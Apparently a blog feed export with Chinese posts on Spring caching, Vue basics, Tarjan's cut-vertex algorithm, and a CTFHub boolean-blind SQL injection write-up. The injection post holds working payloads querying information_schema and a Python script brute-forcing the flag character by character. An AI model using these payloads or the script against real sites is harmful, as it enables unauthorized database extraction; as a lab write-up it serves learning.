id)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">return</span> blog;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为<code>@Cacheable</code>是基于<code>Spring AOP</code>代理类，内部方法调用是不走代理的，<code>@Cacheable</code>是不起作用的 ，因此需要将这两个方法放到不同的类中。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Spring Boot</tag>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入骚操作之布尔盲注</title>
    <url>/2022/06/15/SQL%E6%B3%A8%E5%85%A5%E9%AA%9A%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<p>这段时间学习<code>SQL</code>注入的时候，发现了一个贼有意思的知识点——布尔盲注。该注入方式一般用于页面回显信息只有两种情况的时候，恰好对应布尔值中的<code>ture</code>和<code>false</code>。<a id="more"></a></p>
<hr>
<p>本文参考自文章<a href="https://blog.csdn.net/qq_35569814/article/details/100175886" target="_blank" rel="noopener">SQL注入之布尔盲注</a></p>
<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>布尔盲注主要用三个函数</p>
<h3 id="length-str"><a href="#length-str" class="headerlink" title="length(str)"></a>length(str)</h3><p>返回字符串<code>str</code>的长度，以字节为单位。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">length</span>(<span class="string">'hello'</span>); <span class="comment"># 5</span></span><br></pre></td></tr></table></figure>

<h3 id="substr-string-start-length"><a href="#substr-string-start-length" class="headerlink" title="substr(string, start, length)"></a>substr(string, start, length)</h3><p>string为字符串；start为起始位置；length为长度。</p>
<blockquote>
<p>注意：mysql中的start是从1开始的。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">substr</span>(<span class="string">'hello'</span>,<span class="number">1</span>,<span class="number">1</span>); <span class="comment"># h</span></span><br></pre></td></tr></table></figure>

<h3 id="ascii-character"><a href="#ascii-character" class="headerlink" title="ascii(character)"></a>ascii(character)</h3><p>返回字符<code>character</code>的<code>ASCII</code>值，如果传入的是一个字符串，则返回其第一个字符的<code>ASCII</code>值。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">ascii</span>(<span class="string">'a'</span>); <span class="comment"># 97</span></span><br></pre></td></tr></table></figure>

<h2 id="注入实现"><a href="#注入实现" class="headerlink" title="注入实现"></a>注入实现</h2><p>题目来源：<a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">ctfhub布尔盲注</a></p>
<p>打开场景后，输入1或者2，页面都显示<code>query_success</code>，输入<code>3</code>则显示<code>query_error</code>，初步判读是可以进行盲注（别判断了，题目就说了是布尔盲注🙃）。</p>
<p>按照正常流程，我们接下来就是<strong>猜数据库名字</strong>了，先查一下数据库名字长度：</p>
<p>输入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length((<span class="keyword">select</span> <span class="keyword">database</span>()))=<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>发现不行，继续尝试：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length((<span class="keyword">select</span> <span class="keyword">database</span>()))=<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>果然猜对了，长度是4！👍</p>
<p>下一步，就是精确数据库名字了，用<code>substr</code>函数可以一步一步将数据库名字试探出来，二分法思想先试一下第一个字母的范围：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>) &gt; <span class="string">'a'</span>;</span><br></pre></td></tr></table></figure>

<p>得知，第一个字母比<code>a</code>大，继续：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>) &gt; <span class="string">'m'</span>;</span><br></pre></td></tr></table></figure>

<p>得知，第一个字母比<code>m</code>大，继续：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>) &gt; <span class="string">'s'</span>;</span><br></pre></td></tr></table></figure>

<p>得知，第一个不大于<code>s</code>，结合之前的，第一个字母是大于<code>m</code>，小于等于<code>s</code>，不断缩小范围，最后猜出第一个字母是<code>s</code>。</p>
<p>如法炮制，最后，得知数据库名字为<code>sqli</code></p>
<p><strong>猜表名</strong></p>
<p>在此之前，我们先来认识一下<code>group_concat</code>函数，该函数可以将结果进行拼接，以逗号间隔。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>经过漫长地测试，我发现……我逐渐失去了耐心却还没有试出长度😭，不管了，先测试第一个字符吧，我发现页面回显的<code>SQL</code>语句中有一个表名是<code>news</code>，先试一下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">4</span>)=<span class="string">'news'</span></span><br></pre></td></tr></table></figure>

<p>竟然不是！会不会是<code>SQL</code>语句本身就有误？</p>
<p>先看看是不是包含<code>news</code>：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and locate('news',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())) &gt; <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>发现语句没问题，那就先看看有没有<code>flag</code>这个表吧：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and locate('flag',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())) &gt; <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>果然有！</p>
<p><strong>猜字段</strong></p>
<p>先猜一下字段总长度：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length((<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()))&gt;<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>小于五，最后试出来是4，盲猜<code>flag</code>😊</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and (<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()) =<span class="string">'flag'</span></span><br></pre></td></tr></table></figure>

<p>果不其然，只有一个字段，字段名为<code>flag</code></p>
<p><strong>猜内容</strong></p>
<p>先看一下行数：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> flag) =<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>确定只有一行！</p>
<blockquote>
<p>如果有多行数据，可以使用limit关键字</p>
</blockquote>
<p>看看总长度：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length((<span class="keyword">select</span> * <span class="keyword">from</span> flag)) &gt; <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>经过漫长地测试，我终于试出来了总长度是32，丧心病狂！！！！😭让我一个一个去测试，那我会崩溃掉的，程序员怎么能做重复无聊的工作呢！</p>
<p>看看前面几个字符是不是<code>ctfhub{</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> * <span class="keyword">from</span> flag),<span class="number">1</span>,<span class="number">7</span>) =<span class="string">'ctfhub&#123;'</span></span><br></pre></td></tr></table></figure>

<p>好了，下面就是用脚本解决问题了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url=<span class="string">r"http://challenge-93e4d1abfb79ed96.sandbox.ctfhub.com:10800/"</span></span><br><span class="line">    code = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">        print(<span class="string">'start idx = '</span>, idx)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">129</span>):</span><br><span class="line">            Params = &#123;<span class="string">"id"</span>:<span class="string">"1 and substr((select * from flag),"</span> + str(idx) + <span class="string">",1) = '"</span>+ chr(c) +<span class="string">"'"</span>&#125;</span><br><span class="line">            response = requests.get(url = url, params = Params)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'query_success'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                code += chr(c)</span><br><span class="line">                print(idx, <span class="string">' ok '</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 由于 mysql 判断的时候不区分大小写，因此code全是大写字母，但是最终答案是小写的</span></span><br><span class="line">    print(code.lower())</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>终于把这道题给写出来了，做得有点痛苦，看来以后得多学学<code>sqlmap</code>这个利器了！</p>
<p>经过这一轮学习，发现网络安全真是防不胜防，方寸之间的漏洞都可能被不发分子利用，也说明了网络安全道路任重道远。</p>
<p>最后，写完这道题我想起了之前遇到的一个电脑高手。</p>
<p>很久以前，那还是我用<code>win98</code>的时候，有次我系统崩溃了，因为我是电脑白痴，我朋友给我介绍了一个高手来帮我修电脑。他看了一下电脑，问我有没有98的盘，我说没有。他想了一下，叫我把固定电话拿给他，我想修电脑要电话干什么，但人家是高手，我也不好说什么，就把电话拔下来给他了。他把电话线空着的一头接在电脑的一个插孔内，然后进入了<code>dos</code>，然后就开始在电话上不停的按着键，他按键的速度非常快，但是只按0，1两个键，我搞不懂这有什么用，但也不敢问，看了半个多小时，他还是不停的按这两个键，我渐渐的有些困，我问他这东西要搞多久，他说要几个小时，我给他倒了杯茶，就一个人去隔壁睡觉了。醒来的时候，一看已经过了4个多小时，我起身到隔壁，看见他正在98里面调试，过了一会儿，他说，你试试，我坐上椅子用了一下，真的好了，我当时也不懂电脑，谢过人家就走了。后来我慢慢对电脑有了了解，终于了解，原来当时那位高手是用机器语言编了一个98系统，我后来问我朋友那位高手的下落，我朋友说前几年去了美国IBM之后，杳无音讯……我很想他，如果谁遇到了，请给我发个短信……</p>
<hr>
<p>==黑帽白帽，就在一念之间！==</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>MySql</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue框架</title>
    <url>/2020/03/21/Vue%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> Vue 是一套用于构建用户界面的<strong>渐进式框架</strong> ，利用Vue可以方面地经行中小型项目的快速构建， 它的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。 这里是它的官网<a href="https://cn.vuejs.org/" target="_blank" rel="noopener">链接</a></p>
<a id="more"></a>

<h2 id="最简单的例子"><a href="#最简单的例子" class="headerlink" title="最简单的例子"></a>最简单的例子</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        &#123;&#123; message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 导包 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el: <span class="string">"#app"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="actionscript">                message: <span class="string">"hello world"</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>一定要导包，可以下载到本地使用，也可以直接通过远程导入的方法导入，对于制作项目，推荐下载到本地，如果只是学习，直接远程导入即可，但是前提是要有网络</strong></p>
<h2 id="el挂载点"><a href="#el挂载点" class="headerlink" title="el挂载点"></a>el挂载点</h2><ul>
<li><p>作用域：el指定的标签范围，即在这个范围之下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    &#123;&#123; message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>选择器的类型：不限于id选择器，下面的三个都是可以的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        &#123;&#123; message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 导包 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 注意看这里</span></span></span><br><span class="line"><span class="actionscript">            el: <span class="string">".app"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="actionscript">                message: <span class="string">"你好"</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        &#123;&#123; message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 导包 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 注意看这里</span></span></span><br><span class="line"><span class="actionscript">            el: <span class="string">"div"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="actionscript">                message: <span class="string">"你好"</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 注意看这里 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        &#123;&#123; message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 导包 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 注意看这里</span></span></span><br><span class="line"><span class="actionscript">            el: <span class="string">"#app"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="actionscript">                message: <span class="string">"你好"</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>值得注意的是，el不能够挂载到单标签和body标签中</strong>，建议使用id选择器和挂载到div中。</p>
</li>
</ul>
<h2 id="date数据对象"><a href="#date数据对象" class="headerlink" title="date数据对象"></a>date数据对象</h2><ul>
<li><p>Vue中用到的数据定义在data中</p>
</li>
<li><p>data中的数据类型不限于字符串，还可以是复杂的数据类型，如对象，数组</p>
</li>
<li><p>渲染复杂类型数据时，遵守js的语法即可，如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">    message: <span class="string">"你好"</span>,</span><br><span class="line">    student: &#123;</span><br><span class="line">        name: <span class="string">"YaleXin"</span>,</span><br><span class="line">        age: <span class="number">20</span>,</span><br><span class="line">        address: <span class="string">"earth"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    test_array: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>引用时加上双大括号即可</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    &#123;&#123; message &#125;&#125;</span><br><span class="line">    &#123;&#123;student.name&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;test_array[0]&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;test_array[2]&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200316/akfBfVATnbor.png" alt></p>
]]></content>
      <categories>
        <category>Vue初级</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Tarjan算法求割点隔边</title>
    <url>/2020/10/19/Tarjan%E7%AE%97%E6%B3%95%E6%B1%82%E5%89%B2%E7%82%B9%E9%9A%94%E8%BE%B9/</url>
    <content><![CDATA[<h2 id="Tarjan"><a href="#Tarjan" class="headerlink" title="Tarjan"></a>Tarjan</h2><p>美国著名科学家，全名 <code>Robert Tarjan</code>，在图论和数据结构方面有着重要突出贡献。本文所介绍的算法是求解有向图强连通分量的算法，它能做到线性时间的复杂度。算法维护两个数组<a id="more"></a></p>
<ul>
<li><code>fdn[]</code>：在<code>DFS</code>中，每个节点被访问的次序，即时间戳。</li>
<li><code>low[]</code>：在<code>DFS</code>中，每个节点不通过与父亲节点直接相连的边而访问的最早时间戳。</li>
</ul>
<p>利用这两个数组可以求解许多问题，例如求割点、割边、强连通分量个数等。</p>
<p>当一个点是割点，满足下面的条件时成立：</p>
<ul>
<li>如果节点<code>u</code>是总的<code>DFS</code>树的根，该节点<code>u</code>有多于1个的子树。</li>
<li>如果节点<code>u</code>不是总的<code>DFS</code>树的根，该节点<code>u</code>存在一颗子树，子树的根节点为<code>v</code>，且<code>dfn[u]&lt;=low[v]</code></li>
</ul>
<p>而一条边<code>(u,v)</code>是割边，当且仅当这两点之间没有重边，而且<code>dfn[u] &lt; low[v]</code></p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 20001</span></span><br><span class="line"><span class="comment">// 割边集合</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; edgeCut;</span><br><span class="line"><span class="comment">// vertexs[] 邻接表 verCut 割点集合</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vertexs[MAXN], verCut, item(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">int</span> dfn[MAXN], low[MAXN];</span><br><span class="line"><span class="keyword">int</span> n, m, countTime = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tarjan</span><span class="params">(<span class="keyword">int</span> nowVertex, <span class="keyword">int</span> father = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">    dfn[nowVertex] = low[nowVertex] = countTime++;</span><br><span class="line">    <span class="keyword">int</span> child, childTree = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; vertexs[nowVertex].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        child = vertexs[nowVertex][i];</span><br><span class="line">        <span class="keyword">if</span> (child == father) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (!dfn[child]) &#123;</span><br><span class="line">            childTree++;</span><br><span class="line">            Tarjan(child, nowVertex);</span><br><span class="line">            <span class="keyword">if</span> (dfn[nowVertex] &lt;= low[child]) flag = <span class="literal">true</span>;</span><br><span class="line">            low[nowVertex] = <span class="built_in">min</span>(low[nowVertex], low[child]);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            low[nowVertex] = <span class="built_in">min</span>(low[nowVertex], dfn[child]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((!father &amp;&amp; childTree &gt; <span class="number">1</span>) || (father &amp;&amp; flag))</span><br><span class="line">        verCut.push_back(nowVertex);</span><br><span class="line">    <span class="keyword">if</span> (father &amp;&amp; low[nowVertex] &gt; dfn[father]) &#123;</span><br><span class="line">        item[<span class="number">0</span>] = father;</span><br><span class="line">        item[<span class="number">1</span>] = nowVertex;</span><br><span class="line">        edgeCut.push_back(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dfn, <span class="number">0</span>, <span class="keyword">sizeof</span>(dfn));</span><br><span class="line">    <span class="keyword">int</span> u, v;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; u &gt;&gt; v;</span><br><span class="line">        vertexs[u].push_back(v);</span><br><span class="line">        vertexs[v].push_back(u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        <span class="keyword">if</span> (!dfn[i]) Tarjan(i);</span><br><span class="line">    <span class="comment">/* for (int i = 1; i &lt;= n; i++)</span></span><br><span class="line"><span class="comment">        printf("%d : %d ---- %d \n", i, dfn[i], low[i]); */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"verCut's is : %d\n"</span>, verCut.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">if</span> (verCut.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sort(verCut.<span class="built_in">begin</span>(), verCut.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; verCut.<span class="built_in">size</span>(); i++) <span class="built_in">printf</span>(<span class="string">"%d "</span>, verCut[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\ndgeCut's is : %d\n"</span>, edgeCut.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">if</span> (edgeCut.<span class="built_in">size</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; edgeCut.<span class="built_in">size</span>(); i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d---%d\n"</span>, edgeCut[i][<span class="number">0</span>], edgeCut[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">6 7</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">1 3</span></span><br><span class="line"><span class="comment">1 4</span></span><br><span class="line"><span class="comment">2 5</span></span><br><span class="line"><span class="comment">3 5</span></span><br><span class="line"><span class="comment">4 5</span></span><br><span class="line"><span 